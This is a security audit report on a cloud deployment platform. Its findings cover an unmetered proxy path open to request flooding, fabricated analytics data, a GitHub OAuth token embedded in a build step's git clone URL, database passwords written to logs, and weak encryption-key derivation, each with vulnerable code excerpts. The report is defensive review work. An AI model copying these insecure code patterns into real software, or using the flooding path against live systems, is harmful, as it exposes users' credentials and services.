**Reviewer correction.** Accurate restatement: the project-proxy plane has no rate limiting at all — not because the subdomain branch "returns before" the limiter, but because the limiter at src/proxy.ts:115 is gated on `pathname.startsWith('/api/')` and the traffic that triggers the analytics write is HTML GETs on non-/api/ paths, which the limiter never covered. Reordering the blocks would not fix the described attack. Consequently an unauthenticated caller can drive, per request to any deployed project subdomain, one uncached Firestore query (getProjectBySlugGlobal, no cache) plus — for HTML GETs — one `analytics_events` Firestore write and one BigQuery streaming insert (route.ts:45,49), with `Cache-Control: no-store` (route.ts:198) preventing any dedupe and the isBot filter (route.ts:9) not matching ordinary clients. Real impact is platform-side cost and pressure on the shared `analytics_events` collection, plus pageview inflation in the victim project's dashboard. It does NOT inflate the victim's bill: nothing on the proxy path calls a usage tracker (`grep -rn "billing/tracker" src/` → only api/billing/usage/route.ts and lib/deployment.ts). Amplification is ~1:1 with the attacker's own request cost on an endpoint that is public by design, and the app's only other limiter is a per-instance in-memory Map keyed `${ip}:${pathname}` (proxy.ts:21,124) that is already near-useless on autoscaled Cloud Run — so this is a low-severity availability/cost-hygiene gap, not medium. The correct fix is a shared-store limiter (or Cloud Armor rateLimitOptions on the edge backend — src/lib/gcp/armor.ts currently defines no rate rules and attaches only to user project backends) plus batching/sampling of edge analytics writes. | Directionally correct, mechanism restated: the public reverse-proxy data path has no effective rate limiting, and each anonymous request costs at least one uncached Firestore query, with HTML GETs additionally costing one Firestore document write plus one BigQuery streaming insert. The cause is not primarily the return-before-line-115 ordering (the described `/?i=1..N` attack has pathname `/`, which never matched the limiter's `pathname.startsWith('/api/')` condition regardless); it is that (a) the limiter only covers `/api/`-prefixed incoming paths, (b) Next.js does not re-run middleware after `NextResponse.rewrite`, so the rewritten `/api/v1/proxy/...` path is never metered, and (c) the handler at src/app/api/v1/proxy/[slug]/[[...path]]/route.ts imports no limiter. The ordering bug at src/proxy.ts:99-112 is real but only additionally exempts subdomain requests whose path already starts with `/api/`. Larger than claimed: src/lib/db.ts:671-690 runs an uncached Firestore slug query on every request including 404s, so the read amplification needs no valid project at all; and route.ts:198 sets `Cache-Control: no-store` so nothing caches in front. Smaller than implied: the "bypassed" limiter was never a real control anyway — per-instance in-memory Map keyed on a spoofable X-Forwarded-For — so this should be tracked as "proxy path is unmetered" rather than as an ordering defect. Fix requires a shared/durable limiter (or Cloud Armor) applied to the proxy handler itself, not a statement reorder.

**Verified code:**

```ts
src/proxy.ts:99-112 (the branch, and the rewrite that ends handling):
  99      if (subdomain && !reservedSubdomains.includes(subdomain)) {
 101          if (pathname.startsWith('/api/v1/collect') || pathname.startsWith('/deployify-insights.js')) {
 102              return NextResponse.next({ headers: responseHeaders, });
 105          }
 107          const url = request.nextUrl.clone();
 108          url.pathname = `/api/v1/proxy/${subdomain}${pathname}`;
 109          return NextResponse.rewrite(url, { headers: responseHeaders, });
 112      }

src/proxy.ts:115 — the limiter the claim says is bypassed is scoped to /api/ pathnames only:
 115      if (pathname.startsWith('/api/')) {
 124              const rateLimitResult = checkRateLimit(`${ip}:${pathname}`, limit);

src/proxy.ts:21 — the store is a per-process in-memory Map:
  21  const rateLimitStore = new Map<string, { count: number; resetAt: number }>();

src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:178-180 — write path is HTML-GET-only, fire-and-forget:
 178          if (method === 'GET' && contentType.includes('text/html')
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted specifically for a guard the finder missed and found none for this path, but the claim's stated MECHANISM is wrong in a way that matters.

WHAT I CHECKED FOR MITIGATIONS (all negative for the rewrite path):
1. A second rate limiter reachable from the proxy route — `grep -rn "checkRateLimit" src/` returns exactly three hits: the definition and single call site inside src/proxy.ts, and an unrelated definition in src/lib/security/index.ts:11. That second one is DEAD CODE: every import of '@/lib/security' across ~30 API routes pulls only `securityHeaders` (`grep -rn "lib/security" src/`), never `checkRateLimit`. So it is not a mitigation.
2. The route handler's own imports (route.ts:1-5) are NextRequest/NextResponse, getProjectBySlugGlobal, getDb/Collections, FieldValue, trackError. No auth helper, no rbac, no limiter, no wrapper.
3. Infra-level WAF: src/lib/gcp/armor.ts has zero matches for rate|throttle|ban|limit, and `enableCloudArmor` attaches to `dfy-${serviceName}-backend` — a *user project's* backend, not the Deployify edge. No terraform/yaml/json in the repo defines rateLimitOptions or enforce_on_key.
4. Caching that would dedupe writes: the opposite. route.ts:198 sets `Cache-Control: no-cache, no-store, must-revalidate` on every proxied HTML response, so every hit re-executes the write path.
5. The `isBot` filter (route.ts:8-11, 15) skips only UAs containing bot/crawler/spider/lighthouse/headless. Default `curl/8.x` matches none of them, so the write fires; and it is a content filter, not a limiter.
6. Cloud Run maxInstances (config.ts:74, cloudbuild.ts:381) applies to deployed user services, not the edge, and caps compute, not Firestore/BigQuery writes.
7. No test pins any behaviour here — there is no proxy test file anywhere in src/.
8. Notably, the OTHER early return at proxy.ts:101 (/api/v1/collect) IS mitigated: src/app/api/v1/collect/route.ts:11-13 and 44-57 implement a 20-req/min per-IP limiter in the handler itself. That is the guard pattern the finder would have hit — but it does not exist on the rewrite branch.

WHERE THE CLAIM IS WRONG — the "bypass" framing:
The line-115 block is gated on `pathname.startsWith('/api/')`. A request to `https://anyproject.deployify.io/?i=1` has pathname `/`, so it would NOT be rate limited even if the subdomain block at line 99 were deleted. The rewrite at line 108 sets `url.pathname = /api/v1/proxy/...` only AFTER the check, and Next.js does not re-run proxy on an internal rewrite. And logEdgeEvent only fires for `method === 'GET' && contentType.includes('text/html')` (route.ts:178) 

</details>

### 🟡 MEDIUM — Analytics stats silently substitute randomly generated fake data when the query is empty or fails
`tenancy-data-7` · `src/lib/analytics.ts:99`

**Failure scenario.** The Firestore branch runs `.where('projectId','==',projectId).where('timestamp','>=',startDate).orderBy('timestamp','desc')` (lines 93-97), a composite query. firestore.indexes.json declares composite indexes only for `projects`, `deployments` and `envVars` — nothing for `analytics_events` — so in a real deployment Firestore rejects it with FAILED_PRECONDITION, the catch at line 183 swallows it, and getMockData returns Math.random() traffic. The same happens on the ordinary empty-result path: a brand-new project with zero visitors gets `snapshot.empty` and is handed fabricated numbers. GET /api/projects/<id>/analytics/stats (src/app/api/projects/[id]/analytics/stats/route.ts:34-39) returns t

**Impact.** Tenants make retention, marketing and performance decisions on fabricated numbers, and a real analytics outage (missing index, Firestore error, credential failure) is completely invisible because the failure path emits plausible data instead of an error.

**Reviewer correction.** Directionally correct, but restate the mechanism and the category. Accurate version: "getAnalyticsStats() in src/lib/analytics.ts returns randomly generated fabricated analytics — visitors, pageviews, bounce rate, traffic sources, geographic breakdown, and Core Web Vitals — presented to the tenant as genuine data, via two unconditional fallbacks to getMockData(): line 99-101 when the Firestore query returns an empty snapshot, and line 183-186 when anything in the try block throws. The guaranteed and dominant trigger is the empty-snapshot branch, not the missing composite index the finder cites — any project with zero analytics events in the requested window (every new project, every project without the tracking snippet installed) hits it, and no index speculation is required. The missing analytics_events composite index in firestore.indexes.json is an unproven secondary trigger, since live index state cannot be determined from the repo. Reachable by any signed-up tenant, including a viewer-role team member, at GET /api/projects/[id]/analytics/stats, with NODE_ENV=production and MOCK_DB unset; the route (line 36) and the dashboard (src/app/dashboard/[id]/analytics/page.tsx) apply no demo/sample labelling. This is a data-integrity and silent-failure defect, NOT a tenancy or data-isolation issue as filed — getMockData emits fresh Math.random() values and exposes no other tenant's data. Aggravating factor: the fabrication also masks total analytics-pipeline outages, since getStatsFromBigQuery's catch (line 47-49) and the outer catch both funnel failures into the same plausible-looking output. Mitigating factor: no billing or metering path consumes these figures, and the mock performance values sit just below every evaluatePerformance threshold so they raise no false alerts." | Accurate restatement: getAnalyticsStats() returns fabricated Math.random() analytics whenever the Firestore query yields no rows (src/lib/analytics.ts:99-101), and the route hands it to the tenant's dashboard with no flag distinguishing it from real telemetry — so any project with zero traffic sees invented visitors, timeseries, traffic sources and Web Vitals. This is a data-integrity / product-trust defect, NOT a tenancy or authorization issue: the route is properly gated by getSession() + checkProjectAccess(), the fabricated values are locally generated randoms that expose no other tenant's data, and the blast radius is one dashboard (no billing, metering, export or webhook consumer of AnalyticsStats exists). The claim's secondary mechanism — that the missing analytics_events composite index in firestore.indexes.json makes the catch at line 183 fire in production — is unsupported: there is no firebase.json in the repo and no CI step deploying indexes, so that file is not the source of truth for live indexes, and the sibling getRealtimeStats query is equally undeclared yet fails closed to zeros. Correct fix is to return null (or an explicit `isSampleData` flag) on the empty path so the existing "No Analytics Data" empty state at src/app/dashboard/[id]/analytics/page.tsx:151-161 stops being dead code, and to update the test at src/lib/analytics.test.ts:93-113 that currently pins the fake-data behaviour.

**Verified code:**

```ts
src/lib/analytics.ts:99-101 (the unconditional empty-snapshot fabrication — the real primary trigger):
    99	        if (snapshot.empty) {
   100	            return getMockData(period);
   101	        }

src/lib/analytics.ts:183-186 (the catch-all fabrication — swallows index errors, permission errors, outages alike):
   183	    } catch (error) {
   184	        console.error('Error fetching internal analytics:', error);
   185	        return getMockData(period);
   186	    }

src/lib/analytics.ts:12-14 — the ONLY MOCK_DB reference in the entire file, and it does not guard getMockData; it empties bqRows and thereby routes execution toward the fallback:
    11	async function getStatsFromBigQuery(projectId: string, days: number): Promise<BQRow[]> {
    12	    if (process.env.MOCK_DB === 'true') {
    13	        return [];
    14	    }

src/lib/analytics.ts:189-199, 226-232 (fabricated values are Math.random(), not another tenant's data — hence not a tenancy issue):
   189	export function getMockData(period: string): AnalyticsStats {
   190	    const days = parseInt(period.replace('d', 
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read all 287 lines of src/lib/analytics.ts, both callers, the RBAC gate, getDb(), firestore.indexes.json, the UI consumer, and the unit test file. The core assertion holds and is reachable by an ordinary tenant in production, but the finder's stated primary mechanism is the weaker of the two paths.

REACHABILITY (the lens I was asked to apply) — CONFIRMED end to end:
1. Entry point: GET /api/projects/[id]/analytics/stats?period=30d (src/app/api/projects/[id]/analytics/stats/route.ts). Gate is only getSession() (line 13) + checkProjectAccess() (line 25). checkProjectAccess (src/middleware/rbac.ts:8-30) returns allowed for ANY team membership regardless of role — a 'viewer' passes — and for personal ownership. So the minimum privilege needed is "signed-up tenant who owns one project", the lowest legitimate bar.
2. Route line 34 calls getAnalyticsStats(id, period) with no env gating whatsoever, and returns `{ stats }` to the client at line 36 with no marker distinguishing real from fabricated.
3. src/store/project-slice.ts:1104-1107 stores the response into `analyticsData`, rendered by src/app/dashboard/[id]/analytics/page.tsx:26. I grepped that page for "demo|mock|sample data" — zero hits. The fabrication is never labelled.
4. MOCK_DB is genuinely irrelevant here. I grepped every MOCK_DB reference in src/. In analytics.ts the ONLY occurrence is line 12-14 inside getStatsFromBigQuery, which returns [] — that guard does not suppress getMockData, it actively routes execution TOWARD it by emptying bqRows so the `if (bqRows.length > 0)` check at line 64 fails. getDb() (src/lib/firebase.ts:53-56) returns real Firestore when MOCK_DB is unset, so the production code reaches the real query and the real fallbacks. The finder's rule-out on this point is correct.
5. Not dead code: src/lib/analytics.test.ts:59-61 explicitly does `delete process.env.MOCK_DB` and then test line 93 "returns mock data when both BQ and Firestore are empty" asserts the behavior. It is deliberate, tested, always-on.

WHERE THE CLAIM IS WRONG — the mechanism:
The finder leads with "missing composite index -> FAILED_PRECONDITION -> catch at line 183 -> getMockData". That half is speculative and I will not certify it. firestore.indexes.json declaring only projects/deployments/envVars is not proof the deployed project lacks an analytics_events index — indexes are routinely created out-of-band via the console or the error link, and the repo file is not authoritative for live index state. I cannot verify production index state from this repo.

But the claim does not need that path. 

</details>

### 🟡 MEDIUM — Decrypted GitHub OAuth access token is embedded in a Cloud Build step argument and persisted in build history
`webhooks-billing-3` · `src/lib/gcp/cloudbuild.ts:505`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** Any push to a connected private repo triggers submitCloudBuild with this config. The token is stored verbatim inside `build.steps[0].args[1]` in the Cloud Build API for the platform's GCP project and is returned in cleartext by `gcloud builds describe <id>` / `cloudbuild.builds.get` to every principal with the Cloud Build Viewer role, for the full retention life of the build record. It is also visible to any process inside that build step via /proc and to the build's own workspace.

**Impact.** A GitHub user OAuth token with the app's full granted scopes (repo access to everything that user can reach, not just this project) is stored in cleartext in shared platform infrastructure. Anyone with Cloud Build read access — a support engineer, a CI service account, or an attacker who achieves the build-time RCE described in the Dockerfile-injection finding — harvests every customer's GitHub to

**Reviewer correction.** Accurate restatement: the cleartext GitHub OAuth token is interpolated into `steps[0].args[1]` of the submitted Cloud Build config (`src/lib/gcp/cloudbuild.ts:505`) and persists in the Build resource for the platform GCP project's build-history retention. Three refinements to the finder's version:

(1) Not webhook-specific. The manual deploy route `src/app/api/projects/[id]/deploy/route.ts:188` does the same and prefers `session?.accessToken` — the live session token of whichever member clicks deploy — over the stored project token, so the leaked credential may belong to a collaborator rather than the project owner.

(2) The real harm is that this nullifies the at-rest encryption applied at `src/app/api/projects/route.ts:211`: the token is encrypted in Firestore, then written in cleartext into a lower-trust store with coarser ACLs, aggregating every tenant's `repo`-scoped (full private-repo read/write, per `src/lib/auth.ts:176`) GitHub token in one harvestable place.

(3) Severity is medium, not high. Reading the Build resource requires `roles/cloudbuild.builds.viewer` (or broader) on the platform's own GCP project. No code grants that to any tenant or external principal, and no unprivileged or cross-tenant path reaches it — so this is an insider/compromised-service-account blast-radius and secret-hygiene defect, not an externally exploitable vulnerability. It is still worth fixing: the correct pattern already exists in this repo at `src/lib/gcp/ingestion.ts:64,71` (`availableSecrets` + `secretEnv`), so the fix is to store the token in Secret Manager and reference it via `secretEnv`, e.g. `git clone https://x-access-token:$$GIT_TOKEN@github.com/...`. | Directionally correct and the code is exactly as cited, but the claimed severity over-reads the audience. There is no unprivileged, anonymous, or cross-tenant read path: the application never returns the Build resource (only `status`/`logUrl`/timestamps from `getBuildStatus`, and GCS step-stdout text from `getBuildLogsContent`), so the only readers are principals holding `cloudbuild.builds.get` on the platform's own GCP project (Cloud Build Viewer / Project Viewer / Editor and every SA with those roles). Accurate restatement: "Every deployment — webhook-triggered or manual, for public and private repos alike, with no non-default configuration — copies a user's plaintext, non-expiring GitHub OAuth token with full `repo` scope out of the encrypted Firestore field and into a durable Cloud Build Build resource (`steps[0].args[1]`) in the platform's GCP project, where it is stored unencrypted for the life of build history and readable by any GCP principal with Cloud Build/Project Viewer. Cloud Build's own secret mechanism (`availableSecrets`/`secretEnv`, or Secret Manager, both of which this file already uses for runtime secrets at line 388) is not used for the git token." This is a secrets-hygiene / blast-radius defect (CWE-522), not an externally exploitable vulnerability — hence medium, not high. Two aggravators I verified that the finder did not mention: (1) the manual-deploy path prefers `session?.accessToken` over the stored project token, so a team `developer` triggering a deploy writes their *own personal* full-`repo` GitHub token into a build record for a project owned by someone else; (2) `git clone https://x-access-token:TOKEN@...` also writes the token into `/workspace/.git/config`, and every generated Dockerfile does `COPY . .` with no `.dockerignore` anywhere in the repo, so the token additionally lands in the builder image layer — and in the vite/static template (`COPY --from=builder /app/${distPath} /usr/share/nginx/html`, dockerfiles.ts:419) a tenant-set `outputDirectory` of `.` would place `.git/config` under the nginx docroot of a service the build explicitly binds to `allUsers`/`roles/run.invoker` (cloudbuild.ts:420), giving an anonymous `GET /.git/config` read. That last path needs a non-default `outputDirectory`, so I did not raise severity on it, but it is worth a separate finding.

**Verified code:**

```ts
src/lib/gcp/cloudbuild.ts:495-513
    // If gitToken is provided, use manual clone step instead of connectedRepository
    if (gitToken) {
        return {
            steps: [
                // Step 0: Clone repository using token
                {
                    name: 'gcr.io/cloud-builders/git',
                    entrypoint: 'bash',
                    args: [
                        '-c',
                        `git clone https://x-access-token:${gitToken}@github.com/${repoFullName} . && git checkout ${commitSha}`,
                    ],
                },
                ...commonSteps
            ],
            images: [imageName, latestImageName],
            options: {
                logging: 'CLOUD_LOGGING_ONLY',
                machineType: 'UNSPECIFIED',

src/lib/gcp/cloudbuild.ts:560-570 (no redaction before transmit)
    const response = await fetch(
        `${CLOUD_BUILD_API}/projects/${gcpProjectId}/locations/${region}/builds`,
        {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${accessToken}`,
             
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted specifically for a guard and found none.

1. The line is exactly as claimed. `src/lib/gcp/cloudbuild.ts:496-507` builds a step whose `args[1]` is a template string interpolating the raw `gitToken`. There is no `availableSecrets`/`secretEnv` on that returned build object, no `--set-secrets`, no placeholder substitution.

2. The token is genuinely plaintext at that point. `decrypt()` (`src/lib/crypto.ts:38-58`) is a real AES-GCM decrypt of the value stored encrypted at `src/app/api/projects/route.ts:211` (`githubToken: encrypt(session.accessToken)`), so the embedded value is the cleartext GitHub OAuth token.

3. No downstream scrubbing. `submitCloudBuild` (`src/lib/gcp/cloudbuild.ts:543-584`) takes `buildConfig: object` and does `body: JSON.stringify(buildConfig)` verbatim — it never inspects, rewrites, or redacts steps. A repo-wide `grep -rn "redact|sanitizeBuild|maskSecret|scrub" src/` returns zero hits.

4. No test pins safe behaviour. `src/lib/gcp/cloudbuild.test.ts` only asserts health-check probe flags on the deploy step; it never exercises the `gitToken` branch.

5. The safe pattern exists in this very codebase and is not applied here, which cuts against mitigation rather than for it: `src/lib/gcp/ingestion.ts:64` uses `secretEnv: ['DATABASE_URL']` with `availableSecrets` at line 71.

6. Reachability is real and is the default path, not an edge case. Every project created stores an encrypted token, and both entry points decrypt and pass it: `src/app/api/webhooks/github/route.ts:164,181` (push) and `:559,577` (PR), plus `src/app/api/projects/[id]/deploy/route.ts:169,188` (manual deploy). `gitToken` truthiness selects the clone branch over the `connectedRepository` branch, so the token-bearing config is what normally gets submitted.

7. The one thing I could count as partial mitigation does not help: `options.logging: 'CLOUD_LOGGING_ONLY'` (line 512) affects log sinks, not the persisted Build resource, and git redacts the URL in its own stdout. The durable leak is the Build resource's `steps[0].args[1]`, which `cloudbuild.builds.get` returns verbatim. `pollBuildStatus` also receives the token (`webhooks/github/route.ts:217`, `:613`) but only holds it in memory for `createDeploymentStatus` (`src/lib/deployment.ts:311-315`) — not an additional persistence sink.

Where I disagree with the finder is calibration and scope, not mechanism — see `correction`. The token is `repo`-scoped (`src/lib/auth.ts:176`), so blast radius per token is the user's full public+private repo read/write. But the read requires GCP IAM on the platform's own

</details>

### 🟡 MEDIUM — Full database connection strings (with passwords) are written to application logs during PR-close cleanup
`webhooks-billing-4` · `src/app/api/webhooks/github/route.ts:338`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** A tenant with a MongoDB Atlas or Memorystore Redis connector and branching enabled closes a pull request. GitHub delivers the `pull_request: closed` webhook; the handler pulls the raw secret out of Secret Manager and console.logs it in full — e.g. `[Cleanup] Dropping ephemeral MongoDB database at mongodb+srv://appuser:Pa55w0rd@cluster0.abcd.mongodb.net/pr42`. On Cloud Run that stdout line lands in Cloud Logging.

**Impact.** Live production/preview database credentials are copied out of Secret Manager into Cloud Logging, where they are retained (30 days by default in the _Default bucket), exported to any configured log sink/SIEM, and readable by every principal holding roles/logging.viewer on the platform project — a far broader and less-audited audience than roles/secretmanager.secretAccessor. Nothing in the app can 

**Reviewer correction.** Real defect, correctly located, but the claim mislabels both the line and the actor model.

(1) Wrong line for the quoted example. Line 338 is the **Redis** log; the `mongodb+srv://appuser:Pa55w0rd@...` example the claim gives is line 375. Both are real, unredacted logs of the same variable, so the finding stands — but the cited line is the weaker of the two.

(2) The cited line (338) does not reliably carry a password. `createMemorystoreInstance` returns `redis://${instanceName}.redis.cache.google.com:6379` (src/lib/gcp/memorystore.ts:48) — no userinfo. So for platform-provisioned Memorystore, line 338 leaks an internal hostname, not a credential. It leaks a password only when the tenant supplies their own AUTH-bearing URI. Line 375 (`mongodb-atlas`) is the solid instance: that type is always tenant-supplied and Atlas SRV strings reliably embed `user:password@`.

(3) Not reachable by an unprivileged attacker, in either direction.
  - Trigger side: POST /api/webhooks/github is HMAC-gated with a real constant-time compare against the platform webhook secret (src/lib/security/index.ts:54-76), so no anonymous actor can forge the event. The trigger is instead a *legitimate* `pull_request: closed` — routine tenant operation, which means it fires reliably rather than adversarially.
  - Read side: no tenant can read these control-plane logs through the product. src/app/api/projects/[id]/logs/route.ts derives `serviceName` server-side from `project.slug` via getProductionServiceName/getPreviewServiceName and src/lib/gcp/logging.ts:155 pins the filter to `resource.labels.service_name`, so there is no pivot from a tenant's log view to the Deployify control plane's own stdout.

Accurate restatement: this is secret sprawl (CWE-532), not an exploitable disclosure primitive. A tenant's third-party MongoDB Atlas credential — one Deployify does not own and cannot rotate on the tenant's behalf — is copied out of Secret Manager and written in plaintext to the control plane's Cloud Run stdout on every PR close. That moves the credential from a tight Secret Manager IAM boundary to a much broader Cloud Logging boundary: anyone with roles/logging.viewer, plus any log-export sink (this stack already uses BigQuery), plus default ~30-day retention. Audience is log-privileged insiders and sinks, not an external actor — hence medium, not high.

The repo already knows the correct pattern: src/lib/gcp/seeding.ts:107,115 logs `connectionString.split('@')[1] || 'database'` to strip userinfo before printing. Applying that same split (or the existing maskString) at lines 338 and 375 is the fix; the finder was right that no redaction is applied on this path. | Confirmed but re-scoped. On `pull_request: closed`, the cleanup loop fetches the raw connection-string secret from Secret Manager and interpolates it whole — credentials included — into two `console.log` calls: line 338 for `memorystore-redis` ("Flushing ephemeral Redis DB at <uri>") and line 375 for `mongodb-atlas` ("Dropping ephemeral MongoDB database at <uri>"). The finder cited line 338 but described the MongoDB message, which is line 375; both are real. `getBranchConnectionString` rewrites only `url.pathname` and returns `url.toString()`, so `user:password@host` survives, and there is no console patch, `removeConsole`, logger wrapper, `no-console` lint rule, or use of `masking.ts` on this path — the adjacent Cloud SQL branch (line 280-286) and `seeding.ts:115` both show the safe idiom the author skipped here.

Severity should be medium rather than high, because the exposure boundary is narrower than claimed. These writes land in the *platform's* Cloud Run stdout, readable by principals with `roles/logging.viewer` on the platform GCP project and by any configured log sinks — not by tenants: the tenant logs API scopes its Logging filter to `service_name="dfy-<slug>"` with slugs sanitized by `slugify`, so no tenant can read the platform's own stream or inject into the filter, there is no admin/global log route, and the connection string never enters an audit record. The webhook also requires a valid GitHub HMAC, so an external actor cannot trigger it on demand. The real harm is CWE-532: long-lived third-party DB credentials (Atlas users, Redis AUTH tokens) sitting in plaintext in a log store with far weaker IAM and retention/export semantics than Secret Manager, silently defeating the rotation and access-audit controls the platform otherwise maintains. Fix by logging only the parsed database name / redacted host, mirroring lines 280-286 and `seeding.ts`.

**Verified code:**

```ts
src/app/api/webhooks/github/route.ts:338 (Redis, cited line)
    console.log(`[Cleanup] Flushing ephemeral Redis DB at ${branchedConnectionString}`);
    const Redis = (await import('ioredis')).default;

src/app/api/webhooks/github/route.ts:375 (MongoDB — the case the claim actually describes)
    console.log(`[Cleanup] Dropping ephemeral MongoDB database at ${branchedConnectionString}`);
    const { MongoClient } = await import('mongodb');
    const client = new MongoClient(branchedConnectionString, { serverSelectionTimeoutMS: 5000 });

Value is the raw secret, unmasked — src/app/api/webhooks/github/route.ts:359-373:
    const baseConnectionString = storage.connectionStringSecretId
        ? await getSecretValue(storage.connectionStringSecretId)
        : null;
    ...
    const branchedConnectionString = getBranchConnectionString(
        baseConnectionString, storage.type, storage.branchingSettings,
        { pullRequestNumber: pull_request.number }
    );

getSecretValue returns the real plaintext when MOCK_DB is unset — src/lib/gcp/secrets.ts:141-158:
    export async function g
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read the full 623-line webhook route, the signature verifier, getBranchConnectionString, getSecretValue, the storage-config write path, the tenant logs API, and the GCP logging filter builder.

The code says what the claim says: two console.log calls emit a Secret-Manager-sourced connection string verbatim, and getBranchConnectionString returns `url.toString()`, which preserves `user:password@`. No masking helper is on this path — maskString/maskData are imported only by the storage query and audit routes, there is no instrumentation.ts, and nothing overrides console. So the finder's core technical assertion holds and I could not refute it.

Three things the claim gets wrong, none fatal but two of them material to severity.

First, the line number is off relative to the example given: 338 is Redis, 375 is MongoDB. The claim quotes a Mongo SRV string while pointing at the Redis line.

Second, the cited line is the weaker instance. Deployify-provisioned Memorystore yields `redis://host.redis.cache.google.com:6379` with no userinfo, so line 338 often leaks only an internal hostname. Line 375 is the one that reliably leaks a password, because `mongodb-atlas` configs are always externally supplied.

Third, and most important for my lens, there is no unprivileged actor on either end. The entry point is genuinely HMAC-gated with timingSafeEqual against the platform webhook secret, so an anonymous actor cannot forge the delivery. And I specifically checked whether a tenant could read the control plane's own logs through the product, which would have made this cross-tenant and critical: they cannot, because the logs route computes serviceName from project.slug server-side and the Cloud Logging filter pins resource.labels.service_name. There is no user-controlled input reaching that filter.

So this is not attacker-triggered and not attacker-readable. What it is: a routine, guaranteed-to-fire operation that copies a tenant's third-party credential out of Secret Manager into Cloud Logging in plaintext, where retention and log sinks widen the audience well beyond Secret Manager IAM. That is a real control failure worth fixing — the repo's own seeding.ts demonstrates the intended `split('@')[1]` redaction, so this is a clear deviation from established convention rather than a design decision — but it is insider/sink exposure, not an exploit chain. High overstates it; medium is right. I did not set refuted=true because nothing about the claim's substance is false, already mitigated, or dead code: the path is live, reachable in normal production with MO

</details>

### 🟡 MEDIUM — Single sha256-derived key with silent JWT_SECRET fallback and no key version makes secret-key rotation impossible without total data loss
`webhooks-billing-5` · `src/lib/crypto.ts:21`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** Two concrete failures. (1) Rotation: an operator who deployed without setting ENCRYPTION_KEY (config.validateConfig() only warns, config.ts:99-101) rotates JWT_SECRET after a session-forgery scare. Every stored ciphertext was produced under sha256(old JWT_SECRET). getEnvVarsForDeployment (src/lib/db.ts:237-243) then throws `Failed to decrypt secret <KEY>` for every project with a secret env var, so all deploys fail; webhooks/github/route.ts:164 `decrypt(project.githubToken)` throws, so every private-repo push webhook 500s. Because the `enc:` envelope has no key identifier, there is no dual-key/decrypt-with-old-then-re-encrypt path and no rotation script exists — the only recovery is asking e

**Impact.** The platform cannot perform routine key rotation — the single most basic incident-response action — without destroying every customer's stored secrets and breaking all deployments. Key reuse across two primitives (HS256 signing and AES-256-GCM data encryption) collapses two separate compromises into one. Additionally the key is a raw sha256 of an operator-chosen string with no salt and no KDF (no 

**Reviewer correction.** Accurate restatement: Deployify derives its AES-256-GCM key as a bare, unsalted sha256 of `process.env.ENCRYPTION_KEY || process.env.JWT_SECRET` (config.ts:60, crypto.ts:21/56) and writes a ciphertext envelope `enc:iv:tag:ciphertext` (crypto.ts:32) that carries no key id or version. There is one key slot, no second/old-key read path, and no re-encryption script anywhere in scripts/. Consequently neither secret can ever be rotated: rotating either one renders every AES-wrapped value permanently undecryptable, and recovery requires every customer to re-enter every secret env var and re-authorize GitHub. This is compounded by validateConfig() omitting ENCRYPTION_KEY from its `required` list and flagging it only when BOTH it and JWT_SECRET are missing (config.ts:87-101), so a deployment that sets only JWT_SECRET silently aliases its session-signing key to its data-encryption key with no warning emitted.

Corrections to the original claim:
1. Not attacker-reachable. No anonymous user, tenant, or viewer can trigger any part of this through any of the ~86 API routes; the only trigger is an operator changing an env var. This is an operational durability and key-management defect, not an exploitable vulnerability — which is why it is medium, not high.
2. Nothing returns 500 from the webhook. The decrypt at webhooks/github/route.ts:164 and the throw at db.ts:241 are both caught by the try/catch spanning route.ts:152-226, which marks the deployment `status: 'error'` and returns HTTP 200 {success:true}. The symptom is silent universal deploy failure, not webhook 500s. The reveal route (reveal/route.ts:44-49) already catches and returns a handled 500.
3. Not limited to private repos — projects/route.ts:211 encrypts githubToken for every project.
4. Asset scope is narrower: only user-marked secret env vars and project.githubToken are under this key. Database connection strings live in GCP Secret Manager via storage.connectionStringSecretId (db.ts:272+) and are unaffected.
5. The key-reuse "blast radius" argument adds little independent severity: anyone holding JWT_SECRET can already forge a session for any user id (auth.ts:10) and read plaintext secrets through the reveal endpoint. Reuse adds only offline decryption of an exfiltrated datastore and loss of audit trail.
6. env.example:43-45 documents ENCRYPTION_KEY normally with `openssl rand -hex 32`, not as optional; the dangerous config is a deviation from the shipped guidance, not the documented default.

Suggested fix, in priority order: add ENCRYPTION_KEY to config.ts's `required` array and drop the `|| process.env.JWT_SECRET` fallback (or at minimum warn loudly when the alias engages); add a key-version tag to the envelope (`enc:v1:...`) plus an ENCRYPTION_KEY_OLD read-only slot so decrypt can fall back; and add a scripts/ re-encryption migration that walks projects, decrypts under the old key, and re-encrypts under the new one. A proper KDF (HKDF or scrypt with a salt) in place of bare sha256 is worth doing in the same change. | Directionally right that JWT_SECRET doubles as the data-encryption key in the live configuration (config.ts:60; .env.local has no ENCRYPTION_KEY) and that the `enc:iv:tag:ct` envelope carries no key identifier and has no re-encryption tooling. But the claimed impact is wrong on both counts. (1) Rotating JWT_SECRET does NOT cause data loss: the `ENCRYPTION_KEY || JWT_SECRET` precedence is itself the rotation path — pin ENCRYPTION_KEY to the old JWT_SECRET value and rotate JWT_SECRET freely; I executed crypto.ts's algorithm and confirmed all ciphertext still decrypts. The defect is that this hatch is undocumented (README's env table omits ENCRYPTION_KEY entirely), not that it is absent. (2) Key separation would not have contained a JWT_SECRET leak: checkProjectAccess (rbac.ts:8-27) authorizes on forged `session.user.id` alone, so the reveal endpoint hands back plaintext over the API, and the GitHub accessToken already rides unencrypted inside the JWT payload (auth.ts:29). Accurate restatement: a configuration-hygiene and defense-in-depth gap — no distinct encryption key is enforced (validateConfig only warns), the ciphertext envelope has no key-version byte, and no re-encryption script exists, so rotating the *encryption* key specifically requires an operator-written one-off migration. No attacker-reachable path; the only novel exposure is offline decryption of a separately-stolen Firestore dump.

**Verified code:**

```ts
src/lib/crypto.ts:4-9, 21, 56 (read in full, 67 lines):
   4  const ENCRYPTION_KEY = config.security.encryptionKey;
   5  const ALGORITHM = 'aes-256-gcm';
   7  if (!ENCRYPTION_KEY) {
